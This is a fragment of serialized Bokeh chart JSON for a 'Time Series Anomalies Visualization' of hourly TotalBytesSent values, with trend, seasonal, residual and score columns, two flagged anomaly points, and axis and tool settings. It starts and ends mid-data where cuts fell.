,12810,12716,13213,13431,28175,27665,30383,29987,28092,28040,28068,29053,28858,25644,26709,31397,28143,22027,20561,12288,13342,13533,13005,15376,13543,13389,13969,15155,26658,27555,29269,29373,29239,28770,29783,30349,30527,27932,28376,31204,29426,25474,23607,16230,16011,15774,14890,16465,14033,13006,12514,13526,20713,21331,20525,19900,20212,18087,19554,19177,19551,17549,17491,19052,19557,18427,17084,10797,10273,10533,10225,12040,10080,9403,9378,11706,16165,17799,16253,16226,18127,15337,17913,16972,17533,15965,15160,14958,17523,17921,16811,12077,10452],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167],\"residual\":[-162,1023,465,-79,81,798,1176,-2579,2117,-2754,-1207,800,527,594,-2572,-2222,1360,-21,-1111,-709,3926,2420,445,1157,781,158,-1022,1110,629,-1775,-1439,1234,-2069,1523,882,924,-2098,-962,1045,134,-1467,-695,-183,1615,-1160,1606,-595,-1926,-1547,-1810,591,-1826,-1848,1414,520,4631,-1238,2329,2212,-3202,672,1262,2966,3103,-1677,-513,1787,-502,-4718,-4760,1133,1315,1750,-2017,167,350,1617,-407,-1660,-2631,-310,3393,-2932,-276,4607,-2382,3093,4504,3278,4837,2177,-1774,-7273,-10146,-2002,-1256,-2119,1909,-897,519,-178,-1484,-396,305,3913,-3055,4182,3356,-3620,1280,-5011,-4813,-1843,-2703,2808,4272,23141,22248,-4046,-1832,-1933,-3793,-2741,-3498,-2984,55,618,-2240,-1854,-1445,-2278,-1487,-475,178,160,-895,182,309,-2885,-3072,-6972,-6539,3193,425,2201,2413,2460,2396,2093,702,22,1955,-341,1850,281,-313,1156,-325,1572,2000,119,115,404,642,-4091,-3461,-235,658],\"score\":{\"__ndarray__\":\"dMxC1+JdrL9qa1u6RmTSP9AAJn+MH8A/mpUZDgYToL/+88Rq3nyOP8qIX8fjc8w/yqm7smE51T8Eq7eXQCXov4JiHB2CUuM/aojBzu/D6b9+77WxQOTWvwwrgMXYhsw/0KYZRTdrwj914l6GRubEPwodWzmqFOi/P2JHy0vX5L+q0ZhcZ6HYP6U+QJ0L8I2/TLmm3kgd1b+3DK41NljLv5Da14qUCPI/CWQwNoEg5j92VL8j9cO+PxCnoPtV39Q/mCVKV8HSyz/A2FJ6mAajPw6fUMh9d9O/iDShUZcA1D/6+ZnlBTLGPxP459MStOC/d7IaRcIv27+I2pQXQkzWPw9DF0++bOO/r6VK0Oal2z+hJ7p4FZDPP4a7sygXj9A/P49NaHax478vHWfkIlvSv9XnDjCKzNI/udhoqFHxnj9FIv83dbTbv+icyUKD08q/S2udiBR6r7+fOTml6VndP/Z8tgeCBda/isxvaUIv3T8A7GmgqR/Hv7LujxDjGeK/b8+LEpkv3b/0vbarAgfhvxLvLQnXycQ/eAL4p+ws4b+uwNFiDmHhvyZgUcNSodk/6W6ny90owj8QyFWI30v1P/7YMmMrd9e/WS59a95I5T9T6d9mnzPkP94G5WWH6e2/h5pXPZnJxz9XSnkK9dDWPyemY/ZRLus/04BSdvVy7D/TaLBVs5ffv2vvL+1sFsS/XD1aKohE4D8Ac3x3Ka7Dv2WRhsHw+PW/Ujuc3LMq9r+E2dwGmG3UP0OwqTEjzNc/1Z0GJrbZ3z9iJEPbhfHiv2ZBnljSW6Q/8B2j1Qq7tz/AikkkZGPdP7xXblC0KcC/OrelHSJH37+yyYsLeaDov240f1aUJLm/rnpxciYi7z+oohflumnrv6enKZYKoLa/rNQkC3Av9T9pD9Slb1LmvwC2qThDW+w/I8Ay52a19D84XlytpBHuPyLxOdDxP/Y/ciMRj6/g4z/L4yM0tLHgv//jQIMR5gDAu8siQw2MB8Am9MV++s3ivyizxdp5zNe/LDljgznj47/M58tNoGXhP33Q1MIVJ9G/yB2XTGMfwj+3FFebgryuv97TCXAGBdy/obZ1teGCv79SmOYp+mW0P7tWXXwt+fE/YGFNqDGN7L+x/uFs5DfzPzyMGlt5yu4/bhIHIgTk8L+AJAyCQybXP78sPC8XVPe/zVRoZn9p9r9FW/1DNVXhvwR+sfoVS+m/jiFfW+u36T9lj1mChqLzPxzCg1ywvRpAGmqk8i21GUCN8isQv9zyvyp8kGYkO+G/rHzsbnkq4r/Y7Mcd/bDxv76AzLEhpem/Nj1OEHhT8L9WwetY8+Trv5o8guCfK34/jn3mb8LJxT9UzxAH8wHlv186aiFGb+G/2qVLwjFM278O0iu+/lvlv5BNoi4+E9y/g+TDED6uwr8UM2wv4PylP8lh1XJsUqM/XH/EQ5sd0b8kRXEgiJSmP1shaSLOsbQ/ZOkXkFv66r8sulJEerXsv8Ht3QzBMwDAZrRo/Htm/r86okGhOUjtP0ynMknRSL0/OApziY4Z5D8P1tPX6g/mP1OP0yxKf+Y/Q33OO6Ln5T+8e7oioxnjP2YcQSH05cg/Y9eYhVjbYb/IjAcDodLhP2/achw/cLu/JDube9HZ4D8gYtdWAp+yPzQb4VBzXbm/gH4YvJja1D9Ntmg670C6v1hpWvkfjtw/fB1/GEM94j880cIY5n+aPxutuDaWUJk/4FeFcLi6uz+nGG5ZPq3GP+e65xoQEvO//cWihKEn8L8Sq+/izZazv7gqc0rmRMc/\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"seasonal\":[-10458,-7690,-8466,-9552,-10514,-9215,-9524,8782,7561,9658,10685,10210,9698,10884,8889,5836,7403,5602,8483,8088,-14677,-11288,-9208,-8551,-10181,-8656,-8195,-9509,-10156,-9215,-9452,7994,6735,9524,9810,8719,8658,9227,8668,6658,6271,5616,9211,7592,-9991,-8307,-9455,-8624,-9901,-9431,-7963,-9404,-9790,-9239,-9286,7033,5986,9059,8898,7406,7385,7637,8134,7080,5115,5440,9664,7158,-4856,-4732,-9579,-8655,-9718,-10112,-7679,-9427,-9565,-9103,-8904,5840,5356,8122,7794,5979,6015,6134,7208,7089,3930,5027,9726,6462,320,-1180,-9490,-8466,-8296,-8841,-6491,-8365,-8606,-8191,-7255,3926,4452,5776,5503,5040,4314,5160,5648,5833,3319,3911,6945,5423,1769,232,-6786,-6621,-6446,-6892,-4846,-6769,-7243,-7131,-5473,2384,3672,3503,3451,4244,2491,4219,4009,4487,2553,2535,4116,4623,3484,2122,-4193,-4758,-4547,-4911,-3155,-5178,-5914,-5988,-3596,953,2684,1237,1313,3319,639,3329,2506,3190,1749,1077,1013,3722,4269,3314,-1259,-2719],\"trend\":[21444,21488,21532,21578,21625,21674,21722,21772,21821,21871,21920,21967,22014,22059,22102,22143,22182,22221,22265,22290,22313,22333,22349,22361,22363,22355,22336,22305,22265,22217,22160,22092,22016,21934,21851,21770,21693,21627,21575,21540,21524,21526,21548,21585,21635,21695,21766,21846,21935,22031,22130,22229,22321,22396,22455,22501,22537,22566,22588,22606,22621,22633,22637,22630,22608,22572,22522,22462,22396,22328,22265,22216,22187,22182,22201,22238,22281,22317,22336,22334,22309,22260,22193,22113,22025,21933,21844,21768,21714,21681,21671,21681,21707,21742,21779,21808,21830,21846,21868,21908,21996,22161,22410,22731,23102,23493,23869,24199,24455,24623,24700,24693,24612,24465,24259,24002,23704,23374,23017,22632,22221,21782,21311,20803,20249,19646,19000,18329,17659,17021,16449,15968,15596,15334,15167,15063,14996,14955,14936,14933,14942,14961,14991,15031,15081,15136,15195,15258,15317,15367,15303,15212,15115,15015,14913,14807,14698,14584,14466,14343,14215,14082,13944,13801,13652,13497,13336,13171],\"weights\":[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]},\"selected\":{\"id\":\"4241\"},\"selection_policy\":{\"id\":\"4240\"}},\"id\":\"4205\",\"type\":\"ColumnDataSource\"},{\"attributes\":{},\"id\":\"4132\",\"type\":\"YearsTicker\"},{\"attributes\":{},\"id\":\"4119\",\"type\":\"UnionRenderers\"},{\"attributes\":{},\"id\":\"4195\",\"type\":\"LinearScale\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"4124\",\"type\":\"DaysTicker\"},{\"attributes\":{\"text\":\"Time Series Anomalies Visualization\"},\"id\":\"4075\",\"type\":\"Title\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":{\"id\":\"4211\"},\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"4211\"}]},\"id\":\"4201\",\"type\":\"Toolbar\"},{\"attributes\":{},\"id\":\"4171\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"4128\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"4121\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{},\"id\":\"4120\",\"type\":\"Selection\"},{\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"id\":\"4121\"},{\"id\":\"4122\"},{\"id\":\"4123\"},{\"id\":\"4124\"},{\"id\":\"4125\"},{\"id\":\"4126\"},{\"id\":\"4127\"},{\"id\":\"4128\"},{\"id\":\"4129\"},{\"id\":\"4130\"},{\"id\":\"4131\"},{\"id\":\"4132\"}]},\"id\":\"4086\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"below\":[{\"id\":\"4085\"}],\"center\":[{\"id\":\"4088\"},{\"id\":\"4092\"},{\"id\":\"4133\"}],\"left\":[{\"id\":\"4089\"}],\"min_border_left\":50,\"plot_height\":300,\"plot_width\":1200,\"renderers\":[{\"id\":\"4113\"},{\"id\":\"4138\"},{\"id\":\"4163\"}],\"title\":{\"id\":\"4075\"},\"toolbar\":{\"id\":\"4099\"},\"toolbar_location\":\"above\",\"x_range\":{\"id\":\"4077\"},\"x_scale\":{\"id\":\"4081\"},\"y_range\":{\"id\":\"4079\"},\"y_scale\":{\"id\":\"4083\"}},\"id\":\"4074\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"axis\":{\"id\":\"4089\"},\"dimension\":1,\"grid_line_color\":null,\"ticker\":null},\"id\":\"4092\",\"type\":\"Grid\"},{\"attributes\":{\"end\":1594020060000.0,\"start\":1593358740000.0},\"id\":\"4077\",\"type\":\"Range1d\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"4106\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{},\"id\":\"4096\",\"type\":\"SaveTool\"},{\"attributes\":{},\"id\":\"4095\",\"type\":\"ResetTool\"},{\"attributes\":{},\"id\":\"4090\",\"type\":\"BasicTicker\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"4126\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"4079\",\"type\":\"DataRange1d\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":null,\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"4073\"},{\"id\":\"4093\"},{\"id\":\"4094\"},{\"id\":\"4095\"},{\"id\":\"4096\"},{\"id\":\"4097\"}]},\"id\":\"4099\",\"type\":\"Toolbar\"},{\"attributes\":{\"axis_label\":\"TimeGenerated\",\"formatter\":{\"id\":\"4106\"},\"ticker\":{\"id\":\"4086\"}},\"id\":\"4085\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"end\":1594080180000.0,\"start\":1593298620000.0},\"id\":\"4189\",\"type\":\"Range1d\"},{\"attributes\":{},\"id\":\"4081\",\"type\":\"LinearScale\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"4130\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"axis_label\":\"TotalBytesSent\",\"formatter\":{\"id\":\"4108\"},\"ticker\":{\"id\":\"4090\"}},\"id\":\"4089\",\"type\":\"LinearAxis\"},{\"attributes\":{\"axis\":{\"id\":\"4085\"},\"grid_line_color\":null,\"ticker\":null},\"id\":\"4088\",\"type\":\"Grid\"},{\"attributes\":{\"overlay\":{\"id\":\"4098\"}},\"id\":\"4094\",\"type\":\"BoxZoomTool\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"4129\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"4072\"},\"glyph\":{\"id\":\"4111\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"4112\"},\"selection_glyph\":null,\"view\":{\"id\":\"4114\"}},\"id\":\"4113\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"align\":\"right\",\"text\":\"Drag the middle or edges of the selection box to change the range in the main chart\",\"text_font_size\":{\"value\":\"10px\"}},\"id\":\"4202\",\"type\":\"Title\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"4093\",\"type\":\"WheelZoomTool\"},{\"attributes\":{},\"id\":\"4191\",\"type\":\"DataRange1d\"},{\"attributes\":{\"data\":{\"TimeGenerated\":{\"__ndarray__\":\"AACgOmQxd0IAAIipZzF3Qg==\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[2]},\"TotalBytesSent\":[48616,45856],\"baseline\":[25474,23607],\"index\":[116,117],\"level_0\":[0,1],\"residual\":[23141,22248],\"score\":{\"__ndarray__\":\"HMKDXLC9GkAaaqTyLbUZQA==\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[2]},\"seasonal\":[1769,232],\"trend\":[23704,23374],\"weights\":[1,1]},\"selected\":{\"id\":\"4172\"},\"selection_policy\":{\"id\":\"4171\"}},\"id\":\"4159\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"formatter\":{\"id\":\"4203\"},\"ticker\":{\"id\":\"4198\"}},\"id\":\"4197\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"4097\",\"type\":\"PanTool\"},{\"attributes\":{\"source\":{\"id\":\"4072\"}},\"id\":\"4114\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"4172\",\"type\":\"Selection\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"4127\",\"type\":\"DaysTicker\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"4123\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"4125\",\"type\":\"DaysTicker\"},{\"attributes\":{\"text\":\"Range Selector\"},\"id\":\"4187\",\"type\":\"Title\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"TimeGenerated\":\"datetime\",\"Tooltip\":\"printf\"},\"tooltips\":[[\"TimeGenerated\",\"@TimeGenerated{%F %T}\"],[\"TotalBytesSent\",\"@TotalBytesSent\"],[\"residual\",\"@residual\"],[\"trend\",\"@trend\"],[\"seasonal\",\"@seasonal\"],[\"weights\",\"@weights\"],[\"baseline\",\"@baseline\"],[\"score\",\"@score\"]]},\"id\":\"4073\",\"type\":\"HoverTool\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"4122\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":0.5,\"fill_color\":\"lightgrey\",\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[4,4],\"line_width\":2,\"right_units\":\"screen\",\"top_units\":\"screen\"},\"id\":\"4098\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"num_minor_ticks\":5,\"tickers\":[{\"id\":\"4242\"},{\"id\":\"4243\"},{\"id\":\"4244\"},{\"id\":\"4245\"},{\"id\":\"4246\"},{\"id\":\"4247\"},{\"id\":\"4248\"},{\"id\":\"4249\"},{\"id\":\"4250\"},{\"id\":\"4251\"},{\"id\":\"4252\"},{\"id\":\"4253\"}]},\"id\":\"4198\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"4247\",\"type\":\"DaysTicker\"},{\"attributes\":{\"line_color\":\"green\",\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"baseline\"}},\"id\":\"4136\",\"type\":\"Line\"},{\"attributes\":{\"fill_color\":{\"value\":\"blue\"},\"line_color\":{\"value\":\"blue\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"score\"}},\"id\":\"4207\",\"type\":\"Circle\"},{\"attributes\":{},\"id\":\"4253\",\"type\":\"YearsTicker\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"4252\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"source\":{\"id\":\"4205\"}},\"id\":\"4210\",\"type\":\"CDSView\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#1f77b4\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"navy\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"4112\",\"type\":\"Circle\"},{\"attributes\":{\"data\":{\"TimeGenerated\":{\"__ndarray__\":\"AACA+dUvd0IAAGho2S93QgAAUNfcL3dCAAA4RuAvd0IAACC14y93QgAACCTnL3dCAADwkuovd0IAANgB7i93QgAAwHDxL3dCAACo3/Qvd0IAAJBO+C93QgAAeL37L3dCAABgLP8vd0IAAEibAjB3QgAAMAoGMHdCAAAYeQkwd0IAAADoDDB3QgAA6FYQMHdCAADQxRMwd0IAALg0FzB3QgAAoKMaMHdCAACIEh4wd0IAAHCBITB3QgAAWPAkMHdCAABAXygwd0IAACjOKzB3QgAAED0vMHdCAAD4qzIwd0IAAOAaNjB3QgAAyIk5MHdCAACw+Dwwd0IAAJhnQDB3QgAAgNZDMHdCAABoRUcwd0IAAFC0SjB3QgAAOCNOMHdCAAAgklEwd0IAAAgBVTB3QgAA8G9YMHdCAADY3lswd0IAAMBNXzB3QgAAqLxiMHdCAACQK2Ywd0IAAHiaaTB3QgAAYAltMHdCAABIeHAwd0IAADDnczB3QgAAGFZ3MHdCAAAAxXowd0IAAOgzfjB3QgAA0KKBMHdCAAC4EYUwd0IAAKCAiDB3QgAAiO+LMHdCAABwXo8wd0IAAFjNkjB3QgAAQDyWMHdCAAAoq5kwd0IAABAanTB3QgAA+IigMHdCAADg96Mwd0IAAMhmpzB3QgAAsNWqMHdCAACYRK4wd0IAAICzsTB3QgAAaCK1MHdCAABQkbgwd0IAADgAvDB3QgAAIG+/MHdCAAAI3sIwd0IAAPBMxjB3QgAA2LvJMHdCAADAKs0wd0IAAKiZ0DB3QgAAkAjUMHdCAAB4d9cwd0IAAGDm2jB3QgAASFXeMHdCAAAwxOEwd0IAABgz5TB3QgAAAKLoMHdCAADoEOwwd0IAANB/7zB3QgAAuO7yMHdCAACgXfYwd0IAAIjM+TB3QgAAcDv9MHdCAABYqgAxd0IAAEAZBDF3QgAAKIgHMXdCAAAQ9woxd0IAAPhlDjF3QgAA4NQRMXdCAADIQxUxd0IAALCyGDF3QgAAmCEcMXdCAACAkB8xd0IAAGj/IjF3QgAAUG4mMXdCAAA43Skxd0IAACBMLTF3QgAACLswMXdCAADwKTQxd0IAANiYNzF3QgAAwAc7MXdCAACodj4xd0IAAJDlQTF3QgAAeFRFMXdCAABgw0gxd0IAAEgyTDF3QgAAMKFPMXdCAAAYEFMxd0IAAAB/VjF3QgAA6O1ZMXdCAADQXF0xd0IAALjLYDF3QgAAoDpkMXdCAACIqWcxd0IAAHAYazF3QgAAWIduMXdCAABA9nExd0IAAChldTF3QgAAENR4MXdCAAD4Qnwxd0IAAOCxfzF3QgAAyCCDMXdCAACwj4Yxd0IAAJj+iTF3QgAAgG2NMXdCAABo3JAxd0IAAFBLlDF3QgAAOLqXMXdCAAAgKZsxd0IAAAiYnjF3QgAA8AaiMXdCAADYdaUxd0IAAMDkqDF3QgAAqFOsMXdCAACQwq8xd0IAAHgxszF3QgAAYKC2MXdCAABID7oxd0IAADB+vTF3QgAAGO3AMXdCAAAAXMQxd0IAAOjKxzF3QgAA0DnLMXdCAAC4qM4xd0IAAKAX0jF3QgAAiIbVMXdCAABw9dgxd0IAAFhk3DF3QgAAQNPfMXdCAAAoQuMxd0IAABCx5jF3QgAA+B/qMXdCAADgju0xd0IAAMj98DF3QgAAsGz0MXdCAACY2/cxd0IAAIBK+zF3QgAAaLn+MXdCAABQKAIyd0IAADiXBTJ3QgAAIAYJMndCAAAIdQwyd0IAAPDjDzJ3QgAA2FITMndC\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"TotalBytesSent\":[10823,14821,13532,11947,11193,13257,13375,27975,31501,28775,31398,32979,32241,33539,28420,25757,30947,27803,29637,29670,11563,13465,13587,14967,12964,13858,13119,13907,12739,11227,11268,31322,26683,32982,32544,31414,28254,29893,31290,28334,26328,26448,30576,30793,10484,14995,11715,11296,10487,10789,14758,10998,10682,14572,13689,34167,27286,33955,33700,26810,30679,31533,33739,32815,26046,27499,33974,29118,12821,12836,13819,14877,14220,10053,14690,13161,14334,12806,11771,25544,27355,33777,27055,27816,32648,25686,32147,33363,28923,31547,33575,26369,14754,10415,10286,12086,11414,14915,14479,14063,13211,12485,14759,26964,31469,26214,33556,32596,25150,31064,25338,25714,26089,25673,34013,33699,48616,45856,12184,14179,13841,11097,13724,10535,10022,12570,14145,18473,19477,19080,17622,18725,17612,19733,19338,18656,17732,17801,16167,16485,11455,10545,13991,10699,12735,12639,14501,12477,11497,10081,11729,18121,17458,18104,16508,17814,16494,17588,18545,19534,16085,15276,15363,18166,13830,13350,11842,11111],\"anomalies\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],\"baseline\":[10985,13797,13066,12026,11111,12458,12198,30554,29383,31529,32605,32178,31713,32944,30992,27979,29586,27824,30748,30379,7636,11044,13141,13809,12182,13699,14141,12796,12109,13002,12707,30087,28752,31458,31661,30489,30352,30855,30244,28199,27795,27143,30759,29177,11644,13388,12310,13222,12034,12599,14166,12824,12530,13157,13168,29535,28524,31625,31487,30012,30006,30270,30772,29711,27723,28012,32186,29620,17539,17596,12685,13561,12469,12070,14522,12810,12716,13213,13431,28175,27665,30383,29987,28092,28040,28068,29053,28858,25644,26709,31397,28143,22027,20561,12288,13342,13533,13005,15376,13543,13389,13969,15155,26658,27555,29269,29373,29239,28770,29783,30349,30527,27932,28376,31204,29426,25474,23607,16230,16011,15774,14890,16465,14033,13006,12514,13526,20713,21331,20525,19900,20212,18087,19554,19177,19551,17549,17491,19052,19557,18427,17084,10797,10273,10533,10225,12040,10080,9403,9378,11706,16165,17799,16253,16226,18127,15337,17913,16972,17533,15965,15160,14958,17523,17921,16811,12077,10452],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167],\"residual\":[-162,1023,465,-79,81,798,1176,-2579,2117,-2754,-1207,800,527,594,-2572,-2222,1360,-21,-1111,-709,3926,2420,445,1157,781,158,-1022,1110,629,-1775,-1439,1234,-2069,1523,882,924,-2098,-962,1045,134,-1467,-695,-183,1615,-1160,1606,-595,-1926,-1547,-1810,591,-1826,-1848,1414,520,4631,-1238,2329,2212,-3202,672,1262,2966,3103,-1677,-513,1787,-502,-4718,-4760,1133,1315,1750,-2017,167,350,1617,-407,-1660,-2631,-310,3393,-2932,-276,4607,-2382,3093,4504,3278,4837,2177,-1774,-7273,-10146,-2002,-1256,-2119,1909,-897,519,-178,-1484,-396,305,3913,-3055,4182,3356,-3620,1280,-5011,-4813,-1843,-2703,2808,4272,23141,22248,-4046,-1832,-1933,-3793,-2741,-3498,-2984,55,618,-2240,-1854,-1445,-2278,-1487,-475,178,160,-895,182,309,-2885,-3072,-6972,-6539,3193,425,2201,2413,2460,2396,2093,702,22,1955,-341,1850,281,-313,1156,-325,1572,2000,119,115,404,642,-4091,-3461,-235,658],\"score\":{\"__ndarray__\":\"dMxC1+JdrL9qa1u6RmTSP9AAJn+MH8A/mpUZDgYToL/+88Rq3nyOP8qIX8fjc8w/yqm7smE51T8Eq7eXQCXov4JiHB2CUuM/aojBzu/D6b9+77WxQOTWvwwrgMXYhsw/0KYZRTdrwj914l6GRubEPwodWzmqFOi/P2JHy0vX5L+q0ZhcZ6HYP6U+QJ0L8I2/TLmm3kgd1b+3DK41NljLv5Da14qUCPI/CWQwNoEg5j92VL8j9cO+PxCnoPtV39Q/mCVKV8HSyz/A2FJ6mAajPw6fUMh9d9O/iDShUZcA1D/6+ZnlBTLGPxP459MStOC/d7IaRcIv27+I2pQXQkzWPw9DF0++bOO/r6VK0Oal2z+hJ7p4FZDPP4a7sygXj9A/P49NaHax478vHWfkIlvSv9XnDjCKzNI/udhoqFHxnj9FIv83dbTbv+icyUKD08q/S2udiBR6r7+fOTml6VndP/Z8tgeCBda/isxvaUIv3T8A7GmgqR/Hv7LujxDjGeK/b8+LEpkv3b/0vbarAgfhvxLvLQnXycQ/eAL4p+ws4b+uwNFiDmHhvyZgUcNSodk/6W6ny90owj8QyFWI30v1P/7YMmMrd9e/WS59a95I5T9T6d9mnzPkP94G5WWH6e2/h5pXPZnJxz9XSnkK9dDWPyemY/ZRLus/04BSdvVy7D/TaLBVs5ffv2vvL+1sFsS/XD1aKohE4D8Ac3x3Ka7Dv2WRhsHw+PW/Ujuc3LMq9r+E2dwGmG3UP0OwqTEjzNc/1Z0GJrbZ3z9iJEPbhfHiv2ZBnljSW6Q/8B2j1Qq7tz/AikkkZGPdP7xXblC0KcC/OrelHSJH37+yyYsLeaDov240f1aUJLm/rnpxciYi7z+oohflumnrv6enKZYKoLa/rNQkC3Av9T9pD9Slb1LmvwC2qThDW+w/I8Ay52a19D84XlytpBHuPyLxOdDxP/Y/ciMRj6/g4z/L4yM0tLHgv//jQIMR5gDAu8siQw2MB8Am9MV++s3ivyizxdp5zNe/LDljgznj47/M58tNoGXhP33Q1MIVJ9G/yB2XTGMfwj+3FFebgryuv97TCXAGBdy/obZ1teGCv79SmOYp+mW0P7tWXXwt+fE/YGFNqDGN7L+x/uFs5DfzPzyMGlt5yu4/bhIHIgTk8L+AJAyCQybXP78sPC8XVPe/zVRoZn9p9r9FW/1DNVXhvwR+sfoVS+m/jiFfW+u36T9lj1mChqLzPxzCg1ywvRpAGmqk8i21GUCN8isQv9zyvyp8kGYkO+G/rHzsbnkq4r/Y7Mcd/bDxv76AzLEhpem/Nj1OEHhT8L9WwetY8+Trv5o8guCfK34/jn3mb8LJxT9UzxAH8wHlv186aiFGb+G/2qVLwjFM278O0iu+/lvlv5BNoi4+E9y/g+TDED6uwr8UM2wv4PylP8lh1XJsUqM/XH/EQ5sd0b8kRXEgiJSmP1shaSLOsbQ/ZOkXkFv66r8sulJEerXsv8Ht3QzBMwDAZrRo/Htm/r86okGhOUjtP0ynMknRSL0/OApziY4Z5D8P1tPX6g/mP1OP0yxKf+Y/Q33OO6Ln5T+8e7oioxnjP2YcQSH05cg/Y9eYhVjbYb/IjAcDodLhP2/achw/cLu/JDube9HZ4D8gYtdWAp+yPzQb4VBzXbm/gH4YvJja1D9Ntmg670C6v1hpWvkfjtw/fB1/GEM94j880cIY5n+aP